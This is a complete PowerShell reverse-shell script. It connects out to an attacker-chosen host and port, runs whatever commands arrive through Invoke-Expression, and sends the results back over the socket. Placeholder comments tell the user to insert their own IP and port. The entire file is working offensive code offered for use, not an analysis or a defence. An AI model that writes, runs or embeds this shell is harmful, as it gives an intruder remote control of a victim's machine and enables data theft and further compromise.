# Set the local host and port for the reverse shell connection
$LHOST = "0.0.0.0"  # Change this to your IP address
$LPORT = 0000       # Change this to your desired port

# Create a TCP client to connect to the listener
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)

# Get the network stream for reading and writing
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Enable auto-flush to ensure data is sent immediately
$StreamWriter.AutoFlush = $true

# Buffer to hold incoming data
$Buffer = New-Object System.Byte[] 1024

# Function to format output for better readability
function Format-Output {
    param (
        [string]$Output
    )
    # Trim the output and avoid extra spaces between commands
    return $Output.Trim()
}

# Main loop to keep the connection alive
while ($TCPClient.Connected) {
    # Check if there is data available to read
    if ($NetworkStream.DataAvailable) {
        # Read the incoming data from the stream
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)

        # Convert the byte array to a string
        $Code = [text.encoding]::UTF8.GetString($Buffer, 0, $RawData)

        # Check if the received command is valid
        if ($TCPClient.Connected -and $Code.Length -gt 0) {
            # Handle exit command
            if ($Code.Trim() -eq "exit") {
                Write-Host "[*] Exiting the shell..."
                break  # Exit the loop
            }

            # Execute the command and capture the output
            $Output = try {
                # Format the output for commands like 'dir'
                $ExecutionResult = Invoke-Expression $Code
                $ExecutionResult | Format-Table -AutoSize | Out-String
            } catch {
                $_  # Capture any exceptions
            }

            # Format the output without extra spaces
            $FormattedOutput = Format-Output $Output

            # Write the formatted output back to the stream with a single newline
            $StreamWriter.Write("$FormattedOutput`n")  # Write without additional spaces
        }
    }

    # Add a small delay to avoid overwhelming the CPU
    Start-Sleep -Milliseconds 100
}

# Clean up: close the streams and the client
$TCPClient.Close()
$NetworkStream.Close()
$StreamReader.Close()
$StreamWriter.Close()
